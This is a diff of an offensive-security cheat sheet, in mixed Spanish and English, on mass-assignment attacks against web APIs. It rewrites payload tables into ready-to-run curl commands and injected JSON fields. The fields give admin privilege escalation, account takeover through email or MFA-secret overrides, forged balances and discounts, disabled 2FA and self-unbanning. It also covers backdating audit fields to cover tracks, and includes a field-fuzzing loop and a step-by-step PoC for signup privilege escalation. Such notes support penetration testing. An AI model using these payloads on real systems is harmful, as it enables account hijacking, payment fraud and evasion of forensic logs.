@@ -22,155 +22,120 @@ linked:
 
 ## Privilege Escalation
 
-| **Field target** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `isAdmin` boolean | `{"isAdmin": true}` | Most classic vector. |
-| `is_admin` snake_case | `{"is_admin": true}` | Python/Ruby convention. |
-| `admin` simple | `{"admin": true}` | Some apps use short form. |
-| `role` string | `{"role": "admin"}` / `"administrator"` / `"superadmin"` / `"root"` | Variants per app. |
-| `roles` array | `{"roles": ["admin", "user"]}` | Multi-role. |
-| `permissions` array | `{"permissions": ["*"]}` o `["read", "write", "delete"]` | Granular. |
-| `is_superuser` (Django) | `{"is_superuser": true}` | Django default flag. |
-| `is_staff` (Django) | `{"is_staff": true}` | Django admin access. |
-| `groups` array | `{"groups": ["admins"]}` | LDAP-style. |
-| `tier` / `plan` | `{"tier": "enterprise"}` / `"plan": "premium"` | Bypass paywall. |
-| `subscription` | `{"subscription": "lifetime"}` | Same. |
-| `level` | `{"level": 99}` | Numeric privesc. |
-| `access_level` | `{"access_level": "admin"}` | Granular. |
-| `userType` | `{"userType": "ADMIN"}` | Enum. |
-| `scope` (OAuth-style) | `{"scope": "admin read write"}` | OAuth scope inj. |
+| `curl -X POST https://target/api/signup -d '{"email":"x@y.z","password":"x","isAdmin":true}'` | Cuenta nueva con `isAdmin=true` | Signup acepta isAdmin sin filtrar. |
+| Inject `"is_admin": true` en cualquier mutation/PUT | Privesc Python/Ruby naming | Backend Rails / Django / Flask. |
+| Inject `"role": "admin"` (probar `administrator`, `superadmin`, `root`) | Role string-based privesc | Role como string field. |
+| Inject `"roles": ["admin","user"]` | Multi-role array | App con array de roles. |
+| Inject `"permissions": ["*"]` o `["read","write","delete"]` | Granular permissions privesc | RBAC granular. |
+| Inject `"is_superuser": true` y `"is_staff": true` | Django superuser + admin panel | Backend Django. |
+| Inject `"groups": ["admins"]` | LDAP-style group membership | Apps con LDAP groups. |
+| Inject `"tier": "enterprise"` o `"plan": "premium"` | Paywall bypass | Tier/plan field mutable. |
+| Inject `"level": 99` o `"access_level": "admin"` | Numeric/enum privesc | Sistemas tier-based. |
+| Inject `"scope": "admin read write"` | OAuth scope inject | Apps con scope field plain. |
+| `for f in isAdmin is_admin admin role roles permissions; do curl ... -d "{\"$f\":true}"; done` | Fuzz field names rapido | No conocés naming convention. |
 ^ma-vector-privesc
 
 ### PoC privilege escalation
 
 ```bash
-# Self-register con admin field
+# Self-register con isAdmin
 curl -X POST https://target/api/signup \
   -H "Content-Type: application/json" \
-  -d '{
-    "email": "atacante@evil.com",
-    "password": "P@ssw0rd",
-    "name": "User",
-    "isAdmin": true,
-    "role": "admin"
-  }'
+  -d '{"email":"atacante@evil.com","password":"P@ssw0rd","name":"User","isAdmin":true,"role":"admin"}'
 
 # Login + verify privesc
-curl -X POST https://target/api/login \
-  -d '{"email":"atacante@evil.com","password":"P@ssw0rd"}'
-# Response: {token: "..."}
+TOKEN=$(curl -s -X POST https://target/api/login \
+  -d '{"email":"atacante@evil.com","password":"P@ssw0rd"}' | jq -r .token)
 
-curl https://target/api/admin/users \
-  -H "Authorization: Bearer $TOKEN"
-# Si 200 → privesc successful
+curl https://target/api/admin/users -H "Authorization: Bearer $TOKEN"
+# 200 OK → privesc successful
 ```
 
 ___
 
 ## Account Takeover
 
-| **Field target** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `id` / `_id` | `{"id": 1}` / `{"_id": 1}` | Take over user 1 (admin). |
-| `user_id` | `{"user_id": 1}` | Same. |
-| `email` (override) | `{"email": "victim@target.com"}` | Email-based ATO. |
-| `username` | `{"username": "admin"}` | Username swap. |
-| `phone` | `{"phone": "+1...victim_phone"}` | Phone linking abuse. |
-| `password_hash` | `{"password_hash": "$2b$10$<known>"}` | Set known hash. |
-| `password_reset_token` | `{"password_reset_token": "ATTACKER_TOKEN"}` | Generate own token. |
-| `mfa_secret` | `{"mfa_secret": "BASE32SECRET"}` | Atacante controls 2FA. |
-| `api_key` | `{"api_key": "atacante_api_key"}` | Pre-set API access. |
-| `oauth_id` | `{"oauth_id": "victim_google_id"}` | Federated identity hijack. |
-| `external_id` | `{"external_id": "victim_external"}` | Cross-system link. |
-| `verified_email` boolean | `{"email_verified": true}` | Skip verification. |
-| `phone_verified` | `{"phone_verified": true}` | Same. |
-| `mfa_enabled` reset | `{"mfa_enabled": false}` | Disable 2FA. |
-| Linked accounts | `{"linked_accounts":[...]}` | Override links. |
+| `curl -X PUT https://target/api/profile -d '{"id":1}'` | Hijack identity user 1 | Backend deja override del id en profile update. |
+| Inject `"user_id": 1` o `"_id": 1` | Same effect, naming variants | Mongo / SQL convention. |
+| Inject `"email": "victim@target.com","email_verified": true` en PUT /profile | Linked email-based ATO | Backend permite email change sin re-confirm. |
+| Inject `"username": "admin"` | Username swap → admin pretendiente | Username mutable. |
+| Inject `"password_hash": "$2b$10$<hash_conocido>"` | Set password hash directo | Backend acepta hash crudo. |
+| Inject `"password_reset_token": "ATTACKER_TOKEN"` | Pre-set propio reset token | Token mutable via mass assign. |
+| Inject `"mfa_secret": "BASE32SECRETMINE"` | Atacante controla TOTP de victim | MFA secret mutable. |
+| Inject `"api_key": "atacante_api_key"` | Pre-asignar API key conocida | API key field mutable. |
+| Inject `"oauth_id": "victim_google_id"` | Federated identity hijack | OAuth ID swap. |
+| Inject `"email_verified": true,"phone_verified": true,"mfa_enabled": false` | Skip todas las verificaciones | Verification flags mutables. |
+| Inject `"linked_accounts": [{...}]` | Override OAuth linked accounts | Linked array mutable. |
 ^ma-vector-ato
 
 ### Email-based ATO
 
 ```bash
 # Backend: PUT /api/profile updates user fields
-# Si backend permite email change sin re-confirmation ni old password:
+# Si backend permite email change sin re-confirmation:
 
 curl -X PUT https://target/api/profile \
   -H "Authorization: Bearer $MY_TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{
-    "email": "victim@target.com",
-    "email_verified": true
-  }'
+  -d '{"email":"victim@target.com","email_verified":true}'
 
-# Then password reset → email goes to atacante's inbox? No — sent to "new" email
-# But atacante NOW owns the email field of own user → identity hijack
+# Now my own account claims victim's email
+# Trigger password reset → reset link va al email "victim@target.com" que ahora es mío
 ```
 
 ___
 
 ## Financial / Quota Fields
 
-| **Field target** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `balance` | `{"balance": 99999999}` | Direct credit. |
-| `credits` | `{"credits": 99999999}` | App credits / points. |
-| `points` | `{"points": 99999999}` | Loyalty points. |
-| `tokens` | `{"tokens": 99999999}` | App tokens. |
-| `wallet` | `{"wallet": 99999999}` | Wallet balance. |
-| `tier` paid | `{"tier": "enterprise"}` | Paywall bypass. |
-| `subscription_status` | `{"subscription_status": "active"}` | Skip payment. |
-| `subscription_expires_at` | `{"subscription_expires_at": "2099-12-31"}` | Extend. |
-| `trial_extended` | `{"trial_extended": true}` | Bypass trial cap. |
-| `quota_used` | `{"quota_used": 0}` | Reset usage counter. |
-| `quota_limit` | `{"quota_limit": 99999999}` | Override limit. |
-| `monthly_limit` | `{"monthly_limit": 99999999}` | Same. |
-| `discount` | `{"discount": 100}` | Force max discount. |
-| `tax_rate` | `{"tax_rate": 0}` | No tax. |
-| `referral_credit` | `{"referral_credit": 99999999}` | Referral abuse. |
+| Inject `"balance": 99999999` en PUT/PATCH | Forge balance de cuenta | Balance mutable. |
+| Inject `"credits": 99999999` o `"points": 99999999` o `"tokens": 99999999` | App credits/points/tokens forge | Loyalty/credits sistema. |
+| Inject `"wallet": 99999999` | Wallet balance forge | Wallet field mutable. |
+| Inject `"tier": "enterprise"` o `"subscription_status": "active"` | Paywall + subscription bypass | Tier/subscription mutable. |
+| Inject `"subscription_expires_at": "2099-12-31"` | Extender subscripción | Expires field mutable. |
+| Inject `"trial_extended": true` | Bypass trial cap | Trial flag mutable. |
+| Inject `"quota_used": 0,"quota_limit": 99999999` | Reset usage + raise limit | Quota fields mutables. |
+| Inject `"discount": 100` | Force discount máximo | Discount mutable. |
+| Inject `"tax_rate": 0` en checkout/order PUT | Skip tax | Tax mutable. |
+| Inject `"referral_credit": 99999999` | Forge referral credits | Referral abuse. |
 ^ma-vector-financial
 
 ___
 
 ## Status Flags
 
-| **Field target** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `is_active` | `{"is_active": true}` | Activate disabled account. |
-| `is_verified` | `{"is_verified": true}` | Skip email verify. |
-| `email_verified` | `{"email_verified": true}` | Same. |
-| `phone_verified` | `{"phone_verified": true}` | Phone verify skip. |
-| `mfa_enabled` | `{"mfa_enabled": false}` | Disable 2FA. |
-| `mfa_setup_complete` | `{"mfa_setup_complete": false}` | Reset. |
-| `kyc_verified` | `{"kyc_verified": true}` | Skip KYC. |
-| `is_blocked` | `{"is_blocked": false}` | Unblock self. |
-| `is_banned` | `{"is_banned": false}` | Unban. |
-| `password_change_required` | `{"password_change_required": false}` | Skip forced change. |
-| `force_logout` | `{"force_logout": false}` | Persist session. |
-| `terms_accepted` | `{"terms_accepted": true}` | Skip ToS. |
-| `tutorial_completed` | `{"tutorial_completed": true}` | Skip onboarding. |
-| `is_public` (visibility) | `{"is_public": true}` | Visibility hijack. |
-| `notifications_enabled` | `{"notifications_enabled": false}` | Annoyance / silent attack. |
+| Inject `"is_active": true` | Re-activar cuenta deshabilitada | Disabled accounts. |
+| Inject `"is_verified": true,"email_verified": true,"phone_verified": true,"kyc_verified": true` | Skip todas las verificaciones | Verification flags mutables. |
+| Inject `"mfa_enabled": false,"mfa_setup_complete": false` | Disable 2FA propio o de otro user | MFA fields mutables. |
+| Inject `"is_blocked": false,"is_banned": false` | Self-unban / unblock | Punitive flags mutables. |
+| Inject `"password_change_required": false,"force_logout": false` | Persist session forzada | Forced reset bypass. |
+| Inject `"terms_accepted": true,"tutorial_completed": true` | Skip ToS / onboarding gates | Initial-flow bypass. |
+| Inject `"is_public": true` en docs/profile | Visibility hijack — exponer items privados | Visibility mutable. |
+| Inject `"is_locked": false` en order/transaction | Re-abrir transaction cerrada | Lock flag mutable. |
 ^ma-vector-status
 
 ___
 
 ## Audit Fields (Backdating / Cover Tracks)
 
-| **Field target** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `created_at` | `{"created_at": "1970-01-01T00:00:00Z"}` | Backdate creation. |
-| `updated_at` | `{"updated_at": "..."}` | Forge update timestamp. |
-| `deleted_at` | `{"deleted_at": null}` | Restore soft-deleted. |
-| `created_by` | `{"created_by": 1}` | Forge author. |
-| `modified_by` | `{"modified_by": 1}` | Forge modifier. |
-| `version` | `{"version": 1}` | Optimistic lock bypass. |
-| `revision` | `{"revision": 0}` | Reset revision. |
-| `audit_log_id` | `{"audit_log_id": null}` | Detach audit. |
-| `last_login_ip` | `{"last_login_ip": "127.0.0.1"}` | Forge login IP. |
-| `last_login_at` | `{"last_login_at": "..."}` | Forge login time. |
-| `seen_at` / `viewed_at` | Forge view timestamps | Edge. |
-| `ip_address` | `{"ip_address": "127.0.0.1"}` | Internal trust. |
-| `user_agent` | Forge UA | Forensics evasion. |
+| Inject `"created_at": "1970-01-01T00:00:00Z"` | Backdate creation | created_at mutable. |
+| Inject `"updated_at": "1970-01-01T00:00:00Z"` | Forge update timestamp | Cover modificación reciente. |
+| Inject `"deleted_at": null` | Restore soft-deleted record | Soft-delete bypass. |
+| Inject `"created_by": 1` o `"modified_by": 1` | Forge author/editor | Audit trail forge. |
+| Inject `"version": 1` o `"revision": 0` | Optimistic lock bypass | Concurrency control bypass. |
+| Inject `"audit_log_id": null` | Detach del audit log | Trail removal. |
+| Inject `"last_login_ip": "127.0.0.1","last_login_at": "..."` | Forge login forensics | Internal trust + cover tracks. |
+| Inject `"ip_address": "127.0.0.1"` | Internal IP trust bypass | App con IP-based ACL. |
+| Inject `"user_agent": "Mozilla/5.0 ..."` | Forge UA en logs | Forensics evasion. |
 ^ma-vector-audit
 
 ***
